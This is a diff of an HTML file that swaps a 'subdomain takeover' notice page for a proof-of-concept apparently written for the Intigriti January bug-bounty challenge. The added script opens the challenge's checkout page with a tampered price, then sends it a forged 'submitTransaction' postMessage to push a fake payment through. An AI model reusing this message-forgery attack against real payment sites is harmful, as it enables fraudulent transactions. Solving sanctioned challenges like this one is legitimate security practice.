@@ -1,12 +1,48 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Subdomain Takeover by 0xNanashi</title>
+  <meta charset="UTF-8">
+  <title>Intigriti January PoC</title>
 </head>
 <body>
-    <h1>Subdomain Takeover by 0xNanashi</h1>
-    <p>If you see this page, it means I have successfully taken over the subdomain.</p>
+  <h1>Processing payment…</h1>
+
+  <script>
+    /*
+      PoC for Intigriti January Challenge
+      XSS → postMessage logic abuse
+    */
+
+    const challengeUrl = 'https://challenge-0126.intigriti.io';
+
+    // لازم الاسم يكون مطابق للسيرفر
+    const currency = '1337coin';
+    const amount = 1;
+
+    // 1) افتح صفحة checkout بسعر وهمي
+    const checkoutWindow = window.open(
+      challengeUrl + '/checkout.html?currency=' + currency + '&price=1',
+      '_blank'
+    );
+
+    // 2) استنى الصفحة تجهز نفسها
+    setTimeout(() => {
+
+      // 3) زوّر رسالة payment gateway
+      checkoutWindow.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+          currency: currency,
+          amount: amount
+        }
+      }, '*');
+
+      // (اختياري) اقفل الصفحة بعد التنفيذ
+      setTimeout(() => {
+        checkoutWindow.close();
+      }, 2000);
+
+    }, 12000); // التوقيت مهم
+  </script>
 </body>
 </html>
